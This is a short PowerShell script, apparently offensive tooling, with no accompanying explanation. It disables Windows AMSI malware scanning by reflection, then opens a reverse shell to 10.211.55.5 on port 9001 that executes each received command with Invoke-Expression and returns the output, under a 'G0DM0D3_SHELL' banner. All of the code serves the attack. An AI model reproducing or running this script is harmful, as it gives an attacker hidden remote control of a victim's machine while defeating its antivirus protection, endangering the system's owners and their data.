
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)


$IP = "10.211.55.5"
$PORT = 9001


$c = New-Object System.Net.Sockets.TCPClient($IP, $PORT)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}


$send = ([text.encoding]::ASCII).GetBytes("CONNECTED TO G0DM0D3_SHELL`nPS " + (Get-Location).Path + "> ")
$s.Write($send, 0, $send.Length)
While(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
    
   
If ($data.Trim() -eq "exit") { break }
    
   
Try {
        $out = (Invoke-Expression $data.Trim() 2>&1 | Out-String)
    } catch {
        $out = $_.Exception.Message + "`n"
    }
    
    
    $send = ([text.encoding]::ASCII).GetBytes($out + "PS " + (Get-Location).Path + "> ")
    $s.Write($send, 0, $send.Length)
    $s.Flush()
}

$c.Close()
